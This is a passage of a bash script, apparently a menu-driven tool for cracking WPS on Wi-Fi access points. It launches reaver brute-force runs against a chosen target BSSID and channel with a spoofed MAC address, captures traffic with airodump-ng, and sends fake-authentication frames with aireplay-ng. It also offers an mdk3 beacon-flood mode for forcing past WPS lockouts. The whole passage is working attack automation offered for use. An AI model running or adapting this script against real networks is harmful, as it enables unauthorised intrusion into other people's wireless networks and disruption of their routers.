		~|~~)
		echo Aborting -
		exit
		;;

		esac
		echo -e  "$warn !!!Wrong input try again!!!$txtrst"

			done





		if [ $RESCAN == r ] || [ $RESCAN == R ]; then
			killall -q reaver &> /dev/null
			sleep .2
			killall -q airodump-ng &> /dev/null
			sleep .2
			killall -q aireplay-ng &> /dev/null
			sleep .2
			killall -q Eterm &> /dev/null
			Eterm -g 80x50-1-70 --cmod "red" -T "Airodump-ng" -e sh  -c "airodump-ng $MON; bash" &

	clear
	while true
	do
	echo ""
			echo -e "$q  If you wish to restart reaver type $yel(r/R)$q,or type $yel(c/C)$q to skip.$txtrst"

	read RESREV
	case $RESREV in
	r|R|c|C) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

		done


clear

			
				if [ $RESREV == r ] || [ $RESREV == R ]; then

				while true
				do
				echo -e "$inp  Enter Channel of Target AP.$txtrst"

				read CHANNEL
				case $CHANNEL in
    				1|2|3|4|5|6|7|8|9|10|11|12|13|14) break ;;
    				~|~~)
    				echo Aborting -
    				exit
     				;;

				esac
				echo -e  "$warn !!!Wrong input try again!!!$txtrst"

					done

sleep 2

				killall -q airodump-ng &> /dev/null

				#Eterm -g 80x10-1-70 --cmod "red" -T "reaver" -e sh  -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 --mac=$VARMAC; bash" &

sleep 1

	if [ $RCHOICE == n ]; then

		Eterm -g 80x10-1-70 --cmod "red" -T "reaver" -e sh  -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 -d 15 -T .5 --mac=$VARMAC; bash" &

		fi

	if [ $RCHOICE == y ]; then

		Eterm -g 80x10-1-70 --cmod "red" -T "reaver -r $RX:$RY" -e sh  -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 -d 15 -T .5 -r $RX:$RY --mac=$VARMAC; bash" &

		fi


		Eterm -g 80x10+1-70 --cmod "red" -T "Airodump-ng" -e sh  -c "airodump-ng -c $CHANNEL --bssid $TARGETAP $MON; bash" &
		echo ""	


		Eterm -g 80x10-1-300 --cmod "red" -T "Aireplay-ng" -e sh  -c "aireplay-ng -1 120 -a $TARGETAP $MON; bash" &
				
		fi

			fi

				fi

clear
while true
do
echo ""
echo -e "$inp If WPS locking exists, type $yel(c/C)$inp to reset router or type $yel(e/E)$inp to end program.$txtrst"

	read STARTR
	case $STARTR in
	c|C|e|E) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

		done


	if [ $STARTR == c ] || [ $STARTR == C ]; then


		clear
		while true
		do
		echo ""

		echo -e $q  "Do you wish to add or continue using Beacon Flood Mode?"
		echo -e $inp     "Type $yel(y/Y)$inp for yes or $yel(n/N)$inp for no.$txtrst" #(BFM)
		read BFM
		case $BFM in
		y|Y|n|N) break ;;
		~|~~)
		echo Aborting -
		exit
		;;

		esac
		echo -e  "$warn !!!Wrong input try again!!!$txtrst"

			done


		fi		

killall -q reaver &> /dev/null
sleep .2
killall -q airodump-ng &> /dev/null
sleep .2
killall -q aireplay-ng &> /dev/null
sleep .2
killall -q mdk3 &> /dev/null
sleep .2
killall -q Eterm &> /dev/null


	done


		fi #if [ $AUTOMAN == m ] || [ $AUTOMAN == M ]; than


clear
sleep 3
while true

do
echo ""
echo ""
echo ""
echo -e "$warn  ####################################################"
echo -e "$warn  #$inp Press y to remove Eterm pages and clear program! #"
echo -e "$warn  ####################################################$txtrst"
echo ""
echo ""

  read CONFIRM
  case $CONFIRM in
    y|Y|YES|yes|Yes) break ;;
    #n|N|no|NO|No)
    #echo Aborting - you entered $CONFIRM
    #exit
    #  ;;

	esac

		done

killall -q Eterm &> /dev/null
killall -q mdk3 &> /dev/null
killall -q airodump-ng &> /dev/null
killall -q aireplay-ng &> /dev/null
killall -q reaver &> /dev/null

echo -e "$info  This was a A Musket Team - Soxrox2212 Collaboration."
echo -e "$info     Bring into view that which is hidden ."
echo -e "$info       Ending Program.$warn.$txtrst.$warn.$txtrst.$warn.$txtrst.$info.....$txtrst"

sleep 7